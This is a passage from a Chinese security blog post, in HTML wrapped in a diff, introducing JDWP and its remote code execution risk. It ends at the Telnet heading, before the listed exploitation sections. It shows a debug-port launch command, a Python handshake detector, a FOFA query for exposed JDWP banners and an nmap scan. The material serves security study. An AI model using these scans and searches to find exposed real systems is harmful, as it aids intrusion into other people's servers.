@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>JDWP初识 - 东隅 Blog</title><meta name="author" content="东隅">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='代码审计, java安全' />
+  <meta itemprop="name" content="JDWP初识">
+  <meta itemprop="datePublished" content="2025-05-21T21:12:01+08:00">
+  <meta itemprop="dateModified" content="2025-05-21T21:12:01+08:00">
+  <meta itemprop="wordCount" content="592">
+  <meta itemprop="keywords" content="代码审计,Java安全"><meta property="og:url" content="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80/jdwp%E5%88%9D%E8%AF%86/">
+  <meta property="og:site_name" content="东隅 Blog">
+  <meta property="og:title" content="JDWP初识">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-05-21T21:12:01+08:00">
+    <meta property="article:modified_time" content="2025-05-21T21:12:01+08:00">
+    <meta property="article:tag" content="代码审计">
+    <meta property="article:tag" content="Java安全">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="JDWP初识">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80/jdwp%E5%88%9D%E8%AF%86/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80/jmx%E5%88%9D%E8%AF%86/" /><link rel="next" href="https://dongyu29.github.io/about/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "JDWP初识",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/java%E5%AE%89%E5%85%A8\/%E5%9F%BA%E7%A1%80\/jdwp%E5%88%9D%E8%AF%86\/"
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "代码审计, java安全","wordcount":  592 ,
+    "url": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/java%E5%AE%89%E5%85%A8\/%E5%9F%BA%E7%A1%80\/jdwp%E5%88%9D%E8%AF%86\/","datePublished": "2025-05-21T21:12:01+08:00","dateModified": "2025-05-21T21:12:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
+        "@type": "Person",
+        "name": "东隅"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ></a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">JDWP初识</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>JDWP初识</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category" title="Category - 代码审计"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div><div class="post-meta-line"><span title="published on 2025-05-21 21:12:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-05-21">2025-05-21</time></span>&nbsp;<span title="592 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 600 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>3 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#介绍">介绍</a></li>
+    <li><a href="#使用">使用</a></li>
+    <li><a href="#识别">识别</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#漏洞原理">漏洞原理</a></li>
+    <li><a href="#环境搭建">环境搭建</a></li>
+    <li><a href="#fofa语法">FOFA语法</a></li>
+    <li><a href="#服务探测">服务探测</a>
+      <ul>
+        <li><a href="#nmap">Nmap</a></li>
+        <li><a href="#telnet">Telnet</a></li>
+        <li><a href="#脚本">脚本</a></li>
+      </ul>
+    </li>
+    <li><a href="#漏洞利用">漏洞利用</a>
+      <ul>
+        <li><a href="#jdwp-shellifier">jdwp-shellifier</a></li>
+        <li><a href="#msf">msf</a></li>
+        <li><a href="#jdb">jdb</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h1 id="jpda" class="heading-element"><span>JPDA</span>
+  <a href="#jpda" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><h2 id="介绍" class="heading-element"><span>介绍</span>
+  <a href="#%e4%bb%8b%e7%bb%8d" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><blockquote>
+<p>JDWP（Java Debug Wire Protocol，Java 调试线协议）是 Java 平台调试架构（JPDA，Java Platform Debugger Architecture）中的一部分，是调试器（debugger）与被调试进程（debuggee）之间通信的协议。</p>
+<p>与PHP的 <code>Xdebug</code> 类似，当其调试端口直接开放在公网上时，很容易被攻击者攻击并且获取系统权限。</p>
+</blockquote>
+<p>JPDA（Java Platform Debugger Architecture）由以下三部分组成：</p>
+<table>
+<thead>
+<tr>
+<th>组件</th>
+<th>作用说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>JDI（Java Debug Interface）</td>
+<td>调试器用的高级 Java API</td>
+</tr>
+<tr>
+<td>JDWP（Java Debug Wire Protocol）</td>
+<td>调试器和被调试进程通信的协议</td>
+</tr>
+<tr>
+<td>JVMTI（Java Virtual Machine Tool Interface）</td>
+<td>JVM 提供的底层接口，用于工具与 JVM 交互</td>
+</tr>
+</tbody>
+</table>
+<p>其中 JDWP 起到了<strong>桥梁作用</strong>：调试器通过 JDI 发送命令，JDWP 负责把命令以二进制格式发送给 JVM（使用 JVMTI）并返回结果。</p>
+<p>其整体架构如图</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202411181547335.webp" alt="image-20241118154709215" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202411181547335.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202411181547335.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202411181547335.webp?size=large 2x" data-title="image-20241118154709215" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="使用" class="heading-element"><span>使用</span>
+  <a href="#%e4%bd%bf%e7%94%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>JDWP 是 JVM 的一个 Agent，在运行 Java 程序时可以通过参数启动 JDWP，例如：</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000 -jar spring-boot-demo-helloworld.jar</span></span></code></pre></div><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>含义说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>transport=dt_socket</code></td>
+<td>使用 socket 作为通信方式</td>
+</tr>
+<tr>
+<td><code>server=y</code></td>
+<td>以服务端身份启动 JDWP（等待调试器连接）</td>
+</tr>
+<tr>
+<td><code>suspend=n</code></td>
+<td>不挂起 JVM（可设为 <code>y</code> 表示在连接前挂起）</td>
+</tr>
+<tr>
+<td><code>address=5005</code></td>
+<td>监听端口号</td>
+</tr>
+</tbody>
+</table>
+<p>一旦监听端口开放，调试器就可以远程连接并执行如下操作：</p>
+<ul>
+<li>设置断点</li>
+<li>查看变量</li>
+<li>修改变量</li>
+<li>执行表达式</li>
+<li>单步调试</li>
+<li>查看线程、堆栈等</li>
+</ul>
+<h2 id="识别" class="heading-element"><span>识别</span>
+  <a href="#%e8%af%86%e5%88%ab" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#58a1dd">python2</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">socket</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">client</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">socket</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">socket</span>()
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">client</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">connect</span>((<span style="color:#a6be9d">&#34;192.168.0.100&#34;</span>, <span style="color:#a6be9d">8000</span>))
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">client</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">send</span>(<span style="color:#a6be9d">&#34;JDWP-Handshake&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span> <span style="color:#58a1dd">client</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">recv</span>(<span style="color:#a6be9d">14</span>)<span style="color:#ff636f">==</span><span style="color:#a6be9d">&#34;JDWP-Handshake&#34;</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">print</span> <span style="color:#a6be9d">&#34;[*] Detected JDWP service&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">client</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">close</span>()</span></span></code></pre></div><h1 id="jdwp远程命令执行漏洞" class="heading-element"><span>JDWP远程命令执行漏洞</span>
+  <a href="#jdwp%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>JDWP 在生产环境中<strong>极其危险</strong>，因为一旦监听了 5005 且无认证，攻击者可以直接连接并执行任意 Java 代码。</p>
+<h2 id="漏洞原理" class="heading-element"><span>漏洞原理</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>如果目标Java应用开启了JDWP服务且对外开放，则攻击者可利用JDWP实现远程代码执行。</p>
+<h2 id="环境搭建" class="heading-element"><span>环境搭建</span>
+  <a href="#%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>以Windows为例，下载Tomcat到本地，在startup.bat中上面添加如下代码开启debug模式：</p>
+<pre tabindex="0"><code>SET CATALINA_OPTS=-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8000</code></pre><p>跑起Tomcat即可。</p>
+<h2 id="fofa语法" class="heading-element"><span>FOFA语法</span>
+  <a href="#fofa%e8%af%ad%e6%b3%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><pre tabindex="0"><code>banner=&#34;jdwp&#34;</code></pre><h2 id="服务探测" class="heading-element"><span>服务探测</span>
+  <a href="#%e6%9c%8d%e5%8a%a1%e6%8e%a2%e6%b5%8b" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>有三种常用方式来进行JDWP服务探测，原理都是一样的，即向目标端口连接后发送<code>JDWP-Handshake</code>，如果目标服务直接返回一样的内容则说明是JDWP服务。</p>
+<h3 id="nmap" class="heading-element"><span>Nmap</span>
+  <a href="#nmap" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>使用Nmap扫描：</p>
+<pre tabindex="0"><code>nmap -sT -sV 192.168.192.1 -p 8000</code></pre><p>扫描会识别到JDWP服务，且有对应的JDK版本信息：</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202411181550522.webp" alt="image-20241118155035424" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202411181550522.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202411181550522.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202411181550522.webp?size=large 2x" data-title="image-20241118155035424" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h3 id="telnet" class="heading-element"><span>Telnet</span>
+  <a href="#telnet" class="heading-mark">
